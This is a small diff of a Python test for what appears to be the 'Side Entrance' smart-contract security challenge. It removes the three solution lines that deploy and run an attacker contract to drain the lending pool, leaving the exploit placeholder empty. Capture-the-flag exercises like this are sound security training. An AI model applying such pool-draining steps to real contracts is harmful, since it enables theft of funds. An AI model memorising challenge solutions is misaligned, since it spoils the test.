@@ -13,9 +13,6 @@ def test_side_entrance():
     attackerInitialEthBalance = attacker.balance()
     assert pool.balance() == ETHER_IN_POOL
     # YOUR EXPLOIT GOES HERE
-    sea = SideEntranceAttacker.deploy(pool.address, {"from": attacker})
-    sea.run({"from": attacker})
-    sea.withdraw({"from": attacker})
 
     # SUCCESS CONDITIONN
     assert pool.balance() == 0
